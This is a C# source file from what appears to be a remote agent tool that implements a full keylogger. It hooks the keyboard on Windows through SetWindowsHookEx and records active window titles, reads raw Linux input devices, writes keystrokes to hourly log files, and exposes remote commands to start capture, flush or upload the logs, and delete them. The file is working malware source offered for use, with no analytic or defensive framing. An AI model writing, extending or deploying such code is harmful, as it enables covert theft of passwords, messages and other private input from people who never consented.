using System.Collections.Concurrent;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json;

namespace FermmAgent.Handlers;

public class KeyloggerHandler
{
    private readonly ILogger<KeyloggerHandler> _logger;
    private static KeyloggerService? _service;
    private static readonly object _lock = new();

    public KeyloggerHandler(ILogger<KeyloggerHandler> logger)
    {
        _logger = logger;
    }

    public async Task<(int ExitCode, List<string> Output, string? Error)> HandleAsync(string payload, CancellationToken ct)
    {
        try
        {
            var action = payload?.ToLowerInvariant() ?? "status";
            
            var (output, error) = action switch
            {
                "start" => await StartKeylogger(),
                "stop" => StopKeylogger(),
                "status" => GetStatus(),
                "flush" => await FlushBuffer(),
                "list" => await ListLogFiles(),
                "upload" => await UploadCurrentHourFile(),
                "delete" => await DeleteAllLogFiles(),
                _ when action.StartsWith("upload:") => await UploadSpecificFile(action.Substring(7)),
                _ when action.StartsWith("get:") => await GetLogFile(action.Substring(4)),
                _ when action.StartsWith("delete:") => await DeleteLogFile(action.Substring(7)),
                _ => (JsonSerializer.Serialize(new { error = "Invalid action. Use: start, stop, status, flush, list, upload, upload:filename, delete, get:filename, delete:filename" }), null)
            };
            
            return (0, new List<string> { output }, error);
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "Keylogger handler error");
            return (1, new List<string>(), ex.Message);
        }
    }

    private async Task<(string Output, string? Error)> StartKeylogger()
    {
        lock (_lock)
        {
            if (_service != null && _service.IsRunning)
            {
                return (JsonSerializer.Serialize(new { status = "already_running", message = "Keylogger is already active" }), null);
            }

            _service = new KeyloggerService(_logger);
        }

        var started = await _service.StartAsync();
        
        if (started)
        {
            _logger.LogInformation("Keylogger started");
            return (JsonSerializer.Serialize(new { status = "started", message = "Keylogger is now active" }), null);
        }
        else
        {
            return (JsonSerializer.Serialize(new { status = "failed", message = "Failed to start keylogger" }), "Platform not supported or insufficient permissions");
        }
    }

    private (string Output, string? Error) StopKeylogger()
    {
        lock (_lock)
        {
            if (_service == null || !_service.IsRunning)
            {
                return (JsonSerializer.Serialize(new { status = "not_running", message = "Keylogger is not active" }), null);
            }

            _service.Stop();
            _logger.LogInformation("Keylogger stopped");
            return (JsonSerializer.Serialize(new { status = "stopped", message = "Keylogger has been stopped" }), null);
        }
    }

    private (string Output, string? Error) GetStatus()
    {
        lock (_lock)
        {
            var isRunning = _service?.IsRunning ?? false;
            var bufferSize = _service?.GetBufferSize() ?? 0;
            var keystrokeCount = _service?.GetKeystrokeCount() ?? 0;
            var startedAt = _service?.StartedAt;

            return (JsonSerializer.Serialize(new
            {
                status = isRunning ? "running" : "stopped",
                is_running = isRunning,
                buffer_size = bufferSize,
                keystroke_count = keystrokeCount,
                started_at = startedAt?.ToString("o"),
                platform = RuntimeInformation.OSDescription
            }), null);
        }
    }

    private async Task<(string Output, string? Error)> FlushBuffer()
    {
        lock (_lock)
        {
            if (_service == null)
            {
                return (JsonSerializer.Serialize(new { status = "not_initialized", data = "" }), null);
            }
        }

        var data = _service.FlushBuffer();
        return (JsonSerializer.Serialize(new
        {
            status = "flushed",
            keystroke_count = data.Count,
            data = data
        }), null);
    }

    public async Task<(string Output, string? Error)> ListLogFiles()
    {
        try
        {
            var logDir = Path.Combine(AppContext.BaseDirectory, "keylogs");
            
            if (!Directory.Exists(logDir))
            {
                return (JsonSerializer.Serialize(new { files = new List<object>(), total_size = 0 }), null);
            }

            var files = Directory.GetFiles(logDir, "*.txt")
                .Select(file => new FileInfo(file))
                .OrderByDescending(f => f.LastWriteTime)
                .Select(f => {
                    var name = f.Name;
                    var status = "active";
                    var type = "original";
                    
                    if (name.StartsWith("fin-"))
                    {
                        status = "completed";
                        type = "uploaded";
                    }
                    else if (name.StartsWith("temp-"))
                    {
                        status = "temporary";
                        type = "uploaded";
                    }
                    else if (name.StartsWith("keylog_"))
                    {
                        // Check if this hour file is still being written to
                        var hourStr = name.Replace("keylog_", "").Replace(".txt", "");
                        if (DateTime.TryParseExact(hourStr, "yyyy-MM-dd_HH", null, System.Globalization.DateTimeStyles.None, out var fileHour))
                        {
                            var now = DateTime.Now;
                            if (now.Hour != fileHour.Hour || now.Date != fileHour.Date)
                            {
                                status = "ready_for_upload";
                            }
                        }
                    }

                    return new
                    {
                        filename = name,
                        size = f.Length,
                        status = status,
                        type = type,
                        created = f.CreationTime.ToString("o"),
                        modified = f.LastWriteTime.ToString("o"),
                        readable_size = FormatFileSize(f.Length)
                    };
                })
                .ToList();

            var totalSize = files.Sum(f => f.size);

            return (JsonSerializer.Serialize(new
            {
                files = files,
                total_files = files.Count,
                total_size = totalSize,
                readable_total_size = FormatFileSize(totalSize),
                directory = logDir,
                stats = new
                {
                    active = files.Count(f => f.status == "active"),
                    completed = files.Count(f => f.status == "completed"),
                    temporary = files.Count(f => f.status == "temporary"),
                    ready_for_upload = files.Count(f => f.status == "ready_for_upload")
                }
            }), null);
        }
        catch (Exception ex)
        {
            return (JsonSerializer.Serialize(new { error = "Failed to list log files", message = ex.Message }), ex.Message);
        }
    }

    public async Task<(string Output, string? Error)> GetLogFile(string filename)
    {
        try
        {
            var logDir = Path.Combine(AppContext.BaseDirectory, "keylogs");
            var filePath = Path.Combine(logDir, filename);

            // Accept both original files (keylog_*.txt) and uploaded files (fin-keylog_*.txt, temp-keylog_*.txt)
            var isValidFilename = filename.EndsWith(".txt") && 
                                 (filename.StartsWith("keylog_") || 
                                  filename.StartsWith("fin-keylog_") || 
                                  filename.StartsWith("temp-keylog_"));

            if (!File.Exists(filePath) || !isValidFilename)
            {
                return (JsonSerializer.Serialize(new { error = "File not found or invalid filename" }), "File not found");
            }

            var lines = await File.ReadAllLinesAsync(filePath);
            var fileInfo = new FileInfo(filePath);

            return (JsonSerializer.Serialize(new
            {
                filename = filename,
                size = fileInfo.Length,
                lines = lines.Length,
                content = lines.TakeLast(500).ToArray(), // Last 500 lines to prevent huge responses
                created = fileInfo.CreationTime.ToString("o"),
                modified = fileInfo.LastWriteTime.ToString("o")
            }), null);
        }
        catch (Exception ex)
        {
            return (JsonSerializer.Serialize(new { error = "Failed to read log file", message = ex.Message }), ex.Message);
        }
    }

    public async Task<(string Output, string? Error)> UploadCurrentHourFile()
    {
        try
        {
            var logDir = Path.Combine(AppContext.BaseDirectory, "keylogs");
            
            if (!Directory.Exists(logDir))
            {
                return (JsonSerializer.Serialize(new { status = "no_logs", message = "No keylog directory found" }), null);
            }

            var currentHour = DateTime.Now;
            var currentHourStr = currentHour.ToString("yyyy-MM-dd_HH");
            var currentFile = $"keylog_{currentHourStr}.txt";
            var currentFilePath = Path.Combine(logDir, currentFile);

            // Check if current hour file exists
            if (!File.Exists(currentFilePath))
            {
                return (JsonSerializer.Serialize(new { status = "no_current_file", message = "No keylog file for current hour" }), null);
            }

            var fileInfo = new FileInfo(currentFilePath);
            
            // Determine if hour is complete
            var now = DateTime.Now;
            var fileHour = DateTime.ParseExact(currentHourStr, "yyyy-MM-dd_HH", null);
            var isHourComplete = now.Hour != fileHour.Hour || now.Date != fileHour.Date;
            
            var prefix = isHourComplete ? "fin-" : "temp-";
            var uploadFileName = $"{prefix}{currentFile}";
            var uploadFilePath = Path.Combine(logDir, uploadFileName);

            // Check if already uploaded (don't upload fin- files again)
            if (File.Exists(uploadFilePath) && isHourComplete)
            {
                return (JsonSerializer.Serialize(new 
                { 
                    status = "already_uploaded", 
                    filename = uploadFileName,
                    message = "File already uploaded for this hour" 
                }), null);
            }

            // Copy current file to upload file
            File.Copy(currentFilePath, uploadFilePath, true);
            
            // Read content for upload
            var content = await File.ReadAllTextAsync(uploadFilePath);
            var lines = content.Split('\n', StringSplitOptions.RemoveEmptyEntries);

            return (JsonSerializer.Serialize(new
            {
                status = "uploaded",
                filename = uploadFileName,
                original_filename = currentFile,
                size = fileInfo.Length,
                lines = lines.Length,
                is_complete = isHourComplete,
                prefix = prefix,
                content = lines,
                upload_time = DateTime.Now.ToString("o")
            }), null);
        }
        catch (Exception ex)
        {
            return (JsonSerializer.Serialize(new { error = "Failed to upload current hour file", message = ex.Message }), ex.Message);
        }
    }

    private async Task<(string Output, string? Error)> UploadSpecificFile(string filename)
    {
        try
        {
            var logDir = Path.Combine(AppContext.BaseDirectory, "keylogs");
            var filePath = Path.Combine(logDir, filename);
            
            if (!File.Exists(filePath))
            {
                return (JsonSerializer.Serialize(new { status = "not_found", message = $"File not found: {filename}" }), null);
            }

            // Check if it's already an uploaded file
            if (filename.StartsWith("fin-") || filename.StartsWith("temp-"))
            {
                return (JsonSerializer.Serialize(new { status = "already_uploaded", filename, message = "This file is already an uploaded version" }), null);
            }

            var fileInfo = new FileInfo(filePath);
            
            // Parse the date from filename like keylog_2025-01-15_14.txt
            var match = System.Text.RegularExpressions.Regex.Match(filename, @"keylog_(\d{4}-\d{2}-\d{2}_\d{2})\.txt");
            if (!match.Success)
            {
                return (JsonSerializer.Serialize(new { status = "invalid_format", message = "Invalid filename format" }), null);
            }

            var fileHourStr = match.Groups[1].Value;
            var fileHour = DateTime.ParseExact(fileHourStr, "yyyy-MM-dd_HH", null);
            var now = DateTime.Now;
            var isHourComplete = now.Hour != fileHour.Hour || now.Date != fileHour.Date;
            
            var prefix = isHourComplete ? "fin-" : "temp-";
            var uploadFileName = $"{prefix}{filename}";
            var uploadFilePath = Path.Combine(logDir, uploadFileName);

            // Copy file to upload version
            File.Copy(filePath, uploadFilePath, true);
            
            // Read content
            var content = await File.ReadAllTextAsync(uploadFilePath);
            var lines = content.Split('\n', StringSplitOptions.RemoveEmptyEntries);

            return (JsonSerializer.Serialize(new
            {
                status = "uploaded",
                filename = uploadFileName,
                original_filename = filename,
                size = fileInfo.Length,
                lines = lines.Length,
                is_complete = isHourComplete,
                prefix,
                upload_time = DateTime.Now.ToString("o")
            }), null);
        }
        catch (Exception ex)
        {
            return (JsonSerializer.Serialize(new { error = "Failed to upload file", message = ex.Message }), ex.Message);
        }
    }

    public async Task<(string Output, string? Error)> DeleteAllLogFiles()
    {
        try
        {
            var logDir = Path.Combine(AppContext.BaseDirectory, "keylogs");
            
            if (!Directory.Exists(logDir))
            {
                return (JsonSerializer.Serialize(new { status = "no_directory", deleted_count = 0 }), null);
            }

            var files = Directory.GetFiles(logDir, "*.txt");
            var deletedCount = 0;
            var errors = new List<string>();

            foreach (var file in files)
            {
                try
                {
                    File.Delete(file);
                    deletedCount++;
                }
                catch (Exception ex)
                {
                    errors.Add($"{Path.GetFileName(file)}: {ex.Message}");
                }
            }

            return (JsonSerializer.Serialize(new
            {
                status = "deleted",
                deleted_count = deletedCount,
                total_files = files.Length,
                errors = errors
            }), errors.Any() ? string.Join("; ", errors) : null);
        }
        catch (Exception ex)
        {
            return (JsonSerializer.Serialize(new { error = "Failed to delete log files", message = ex.Message }), ex.Message);
        }
    }

    public async Task<(string Output, string? Error)> DeleteLogFile(string filename)
    {
        try
        {
            var logDir = Path.Combine(AppContext.BaseDirectory, "keylogs");
            var filePath = Path.Combine(logDir, filename);

            if (!File.Exists(filePath))
            {
                return (JsonSerializer.Serialize(new { error = "File not found", filename = filename }), "File not found");
            }

            if (!filename.EndsWith(".txt") || (!filename.StartsWith("keylog_") && !filename.StartsWith("fin-") && !filename.StartsWith("temp-")))
            {
                return (JsonSerializer.Serialize(new { error = "Invalid filename format", filename = filename }), "Invalid filename");
            }

            File.Delete(filePath);
            
            return (JsonSerializer.Serialize(new
            {
                status = "deleted",
                filename = filename,
                deleted_at = DateTime.Now.ToString("o")
            }), null);
        }
        catch (Exception ex)
        {
            return (JsonSerializer.Serialize(new { error = "Failed to delete file", filename = filename, message = ex.Message }), ex.Message);
        }
    }

    private static string FormatFileSize(long bytes)
    {
        string[] sizes = { "B", "KB", "MB", "GB" };
        double len = bytes;
        int order = 0;
        while (len >= 1024 && order < sizes.Length - 1)
        {
            order++;
            len = len / 1024;
        }
        return $"{len:0.##} {sizes[order]}";
    }

    // Get buffer data for upload (called by upload service)
    public static List<KeylogEntry> GetBufferForUpload()
    {
        lock (_lock)
        {
            return _service?.FlushBuffer() ?? new List<KeylogEntry>();
        }
    }

    public static bool IsActive => _service?.IsRunning ?? false;
}

public class KeylogEntry
{
    public char Key { get; set; }
    public DateTime Timestamp { get; set; }
    public string? WindowTitle { get; set; }
}

public class KeyloggerService
{
    private readonly ILogger _logger;
    private readonly ConcurrentQueue<KeylogEntry> _buffer = new();
    private bool _isRunning;
    private CancellationTokenSource? _cts;
    private Task? _captureTask;
    private int _keystrokeCount;

    public bool IsRunning => _isRunning;
    public DateTime? StartedAt { get; private set; }

    public KeyloggerService(ILogger logger)
    {
        _logger = logger;
    }

    public async Task<bool> StartAsync()
    {
        if (_isRunning) return true;

        _cts = new CancellationTokenSource();
        StartedAt = DateTime.UtcNow;
        _isRunning = true;

        if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
        {
            _captureTask = Task.Run(() => StartWindowsKeylogger(_cts.Token));
            return true;
        }
        else if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux))
        {
            _captureTask = Task.Run(() => StartLinuxKeylogger(_cts.Token));
            return true;
        }
        else if (RuntimeInformation.IsOSPlatform(OSPlatform.OSX))
        {
            _logger.LogWarning("macOS keylogger requires accessibility permissions - not implemented");
            _isRunning = false;
            return false;
        }

        _isRunning = false;
        return false;
    }

    public void Stop()
    {
        _isRunning = false;
        _cts?.Cancel();
        _captureTask?.Wait(TimeSpan.FromSeconds(2));
        _cts?.Dispose();
        _cts = null;
    }

    public int GetBufferSize() => _buffer.Count;
    public int GetKeystrokeCount() => _keystrokeCount;

    public List<KeylogEntry> FlushBuffer()
    {
        var entries = new List<KeylogEntry>();
        while (_buffer.TryDequeue(out var entry))
        {
            entries.Add(entry);
        }
        return entries;
    }

    private void AddKeystroke(char key, string? windowTitle = null)
    {
        _buffer.Enqueue(new KeylogEntry
        {
            Key = key,
            Timestamp = DateTime.UtcNow,
            WindowTitle = windowTitle
        });
        Interlocked.Increment(ref _keystrokeCount);
    }

    #region Windows Implementation

    // Windows API imports for low-level keyboard hook
    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("user32.dll")]
    private static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
    private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

    [DllImport("user32.dll")]
    private static extern bool GetMessage(out MSG lpMsg, IntPtr hWnd, uint wMsgFilterMin, uint wMsgFilterMax);

    [DllImport("user32.dll")]
    private static extern bool TranslateMessage(ref MSG lpMsg);

    [DllImport("user32.dll")]
    private static extern IntPtr DispatchMessage(ref MSG lpMsg);

    [DllImport("user32.dll")]
    private static extern short GetAsyncKeyState(int vKey);

    [DllImport("user32.dll")]
    private static extern int ToUnicode(uint virtualKeyCode, uint scanCode, byte[] keyboardState,
        [Out, MarshalAs(UnmanagedType.LPWStr, SizeConst = 64)] StringBuilder receivingBuffer,
        int bufferSize, uint flags);

    [DllImport("user32.dll")]
    private static extern bool GetKeyboardState(byte[] lpKeyState);

    [DllImport("user32.dll")]
    private static extern uint MapVirtualKey(uint uCode, uint uMapType);

    [StructLayout(LayoutKind.Sequential)]
    private struct MSG
    {
        public IntPtr hwnd;
        public uint message;
        public IntPtr wParam;
        public IntPtr lParam;
        public uint time;
        public POINT pt;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct POINT
    {
        public int X;
        public int Y;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct KBDLLHOOKSTRUCT
    {
        public uint vkCode;
        public uint scanCode;
        public uint flags;
        public uint time;
        public IntPtr dwExtraInfo;
    }

    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private const int WM_SYSKEYDOWN = 0x0104;

    private IntPtr _hookId = IntPtr.Zero;
    private LowLevelKeyboardProc? _proc;

    private void StartWindowsKeylogger(CancellationToken ct)
    {
        _proc = HookCallback;
        
        using var curProcess = System.Diagnostics.Process.GetCurrentProcess();
        using var curModule = curProcess.MainModule;
        
        if (curModule == null)
        {
            _logger.LogError("Failed to get current module for keyboard hook");
            _isRunning = false;
            return;
        }

        _hookId = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, GetModuleHandle(curModule.ModuleName), 0);
        
        if (_hookId == IntPtr.Zero)
        {
            _logger.LogError("Failed to install keyboard hook. Error: {Error}", Marshal.GetLastWin32Error());
            _isRunning = false;
            return;
        }

        _logger.LogDebug("Windows keyboard hook installed");

        // Message loop
        while (!ct.IsCancellationRequested)
        {
            if (GetMessage(out MSG msg, IntPtr.Zero, 0, 0))
            {
                TranslateMessage(ref msg);
                DispatchMessage(ref msg);
            }
        }

        // Cleanup
        if (_hookId != IntPtr.Zero)
        {
            UnhookWindowsHookEx(_hookId);
            _hookId = IntPtr.Zero;
        }
        
        _logger.LogDebug("Windows keyboard hook removed");
    }

    private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN))
        {
            try
            {
                var hookStruct = Marshal.PtrToStructure<KBDLLHOOKSTRUCT>(lParam);
                var vkCode = hookStruct.vkCode;
                var scanCode = hookStruct.scanCode;

                // Get keyboard state
                var keyboardState = new byte[256];
                GetKeyboardState(keyboardState);

                // Convert to unicode character
                var sb = new StringBuilder(2);
                var result = ToUnicode(vkCode, MapVirtualKey(vkCode, 0), keyboardState, sb, sb.Capacity, 0);

                if (result > 0)
                {
                    var key = sb[0];
                    var windowTitle = GetActiveWindowTitle();
                    AddKeystroke(key, windowTitle);
                }
                else
                {
                    // Handle special keys
                    var specialKey = GetSpecialKeyName((int)vkCode);
                    if (specialKey != null)
                    {
                        // Represent special keys as control characters or markers
                        var windowTitle = GetActiveWindowTitle();
                        // Store special keys with a marker format
                        foreach (var c in $"[{specialKey}]")
                        {
                            AddKeystroke(c, windowTitle);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error processing keystroke");
            }
        }

        return CallNextHookEx(_hookId, nCode, wParam, lParam);
    }

    private static string GetActiveWindowTitle()
    {
        var hwnd = GetForegroundWindow();
        var sb = new StringBuilder(256);
        GetWindowText(hwnd, sb, 256);
        return sb.ToString();
    }

    private static string? GetSpecialKeyName(int vkCode)
    {
        return vkCode switch
        {
            0x08 => "BACKSPACE",
            0x09 => "TAB",
            0x0D => "ENTER",
            0x1B => "ESC",
            0x20 => null, // Space is a printable character
            0x25 => "LEFT",
            0x26 => "UP",
            0x27 => "RIGHT",
            0x28 => "DOWN",
            0x2E => "DELETE",
            0x10 => "SHIFT",
            0x11 => "CTRL",
            0x12 => "ALT",
            0x14 => "CAPSLOCK",
            0x5B => "WIN",
            0x5C => "WIN",
            _ => null
        };
    }

    #endregion

    #region Linux Implementation

    private void StartLinuxKeylogger(CancellationToken ct)
    {
        // Find keyboard device
        var inputDevices = Directory.GetFiles("/dev/input", "event*");
        string? keyboardDevice = null;

        foreach (var device in inputDevices)
        {
            try
            {
                // Check if this is a keyboard device
                var deviceName = device.Replace("/dev/input/", "");
                var capsPath = $"/sys/class/input/{deviceName}/device/capabilities/key";
                
                if (File.Exists(capsPath))
                {
                    var caps = File.ReadAllText(capsPath).Trim();
                    // Keyboards have key capability bits set
                    if (!string.IsNullOrEmpty(caps) && caps != "0")
                    {
                        keyboardDevice = device;
                        break;
                    }
                }
            }
            catch { }
        }

        if (keyboardDevice == null)
        {
            _logger.LogError("No keyboard device found. Ensure you have permissions for /dev/input/event*");
            _isRunning = false;
            return;
        }

        _logger.LogDebug("Using keyboard device: {Device}", keyboardDevice);

        try
        {
            using var fs = new FileStream(keyboardDevice, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
            var buffer = new byte[24]; // input_event structure size

            while (!ct.IsCancellationRequested && _isRunning)
            {
                var bytesRead = fs.Read(buffer, 0, buffer.Length);
                if (bytesRead == 24)
                {
                    // Parse input_event structure
                    // struct input_event { struct timeval time; __u16 type; __u16 code; __s32 value; }
                    var type = BitConverter.ToUInt16(buffer, 16);
                    var code = BitConverter.ToUInt16(buffer, 18);
                    var value = BitConverter.ToInt32(buffer, 20);

                    // type 1 = EV_KEY, value 1 = key press
                    if (type == 1 && value == 1)
                    {
                        var key = LinuxKeycodeToChar(code);
                        if (key.HasValue)
                        {
                            AddKeystroke(key.Value);
                        }
                    }
                }
            }
        }
        catch (UnauthorizedAccessException)
        {
            _logger.LogError("Permission denied reading keyboard device. Run with sudo or add user to 'input' group");
            _isRunning = false;
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "Error reading Linux keyboard input");
            _isRunning = false;
        }
    }

    private static char? LinuxKeycodeToChar(ushort code)
    {
        // Basic Linux keycode to character mapping
        // See: /usr/include/linux/input-event-codes.h
        return code switch
        {
            // Numbers
            2 => '1', 3 => '2', 4 => '3', 5 => '4', 6 => '5',
            7 => '6', 8 => '7', 9 => '8', 10 => '9', 11 => '0',

            // Letters (lowercase)
            16 => 'q', 17 => 'w', 18 => 'e', 19 => 'r', 20 => 't',
            21 => 'y', 22 => 'u', 23 => 'i', 24 => 'o', 25 => 'p',
            30 => 'a', 31 => 's', 32 => 'd', 33 => 'f', 34 => 'g',
            35 => 'h', 36 => 'j', 37 => 'k', 38 => 'l',
            44 => 'z', 45 => 'x', 46 => 'c', 47 => 'v', 48 => 'b',
            49 => 'n', 50 => 'm',

            // Special
            57 => ' ',  // Space
            28 => '\n', // Enter
            14 => '\b', // Backspace
            15 => '\t', // Tab

            // Symbols
            12 => '-', 13 => '=',
            26 => '[', 27 => ']',
            39 => ';', 40 => '\'',
            41 => '`',
            43 => '\\',
            51 => ',', 52 => '.', 53 => '/',

            _ => null
        };
    }

    #endregion
}
